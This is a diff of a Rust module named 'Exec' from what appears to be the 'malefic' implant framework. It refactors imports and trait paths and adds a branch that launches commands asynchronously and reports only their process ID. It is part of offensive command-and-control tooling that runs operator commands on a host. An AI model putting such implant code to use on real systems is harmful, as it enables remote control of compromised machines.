@@ -1,13 +1,11 @@
-use crate::{check_request, Module, TaskResult};
-use async_trait::async_trait;
 use futures::{AsyncReadExt, FutureExt, SinkExt};
 use futures::channel::mpsc::{self, UnboundedReceiver, UnboundedSender};
 use futures_timer::Delay;
-use malefic_helper::common::process::{async_command, run_command};
-use malefic_proto::proto::implantpb::spite::Body;
-use malefic_proto::proto::modulepb::ExecResponse;
-use malefic_trait::module_impl;
 use std::time::Duration;
+
+use malefic_helper::common::process::{async_command, run_command};
+use malefic_proto::proto::modulepb::ExecResponse;
+use crate::prelude::*;
 
 pub struct Exec {}
 
@@ -52,14 +50,14 @@ async fn read_pipe_async<R: AsyncReadExt + Unpin + Send>(
 impl Module for Exec {}
 
 #[async_trait]
-impl crate::ModuleImpl for Exec {
+impl malefic_proto::module::ModuleImpl for Exec {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut crate::Input,
-        sender: &mut crate::Output,
-    ) -> crate::Result {
+        receiver: &mut malefic_proto::module::Input,
+        sender: &mut malefic_proto::module::Output,
+    ) -> malefic_proto::module::ModuleResult {
         let request = check_request!(receiver, Body::ExecRequest)?;
         let mut exec_response = ExecResponse::default();
 
@@ -118,16 +116,20 @@ impl crate::ModuleImpl for Exec {
                     }
                 }
             }
-        } else {
+        } else if request.realtime {
             let child = run_command(request.path, request.args)?;
             exec_response.pid = child.id();
             let output = child.wait_with_output()?;
-
             exec_response.status_code = output.status.code().unwrap_or(0);
             if request.output {
                 exec_response.stdout = output.stdout;
                 exec_response.stderr = output.stderr;
             }
+        } else {
+            let child = async_command(request.path, request.args)?;
+            let pid = child.id();
+            exec_response.pid = pid;
+            exec_response.status_code = 0;
         }
 
         exec_response.end = true;
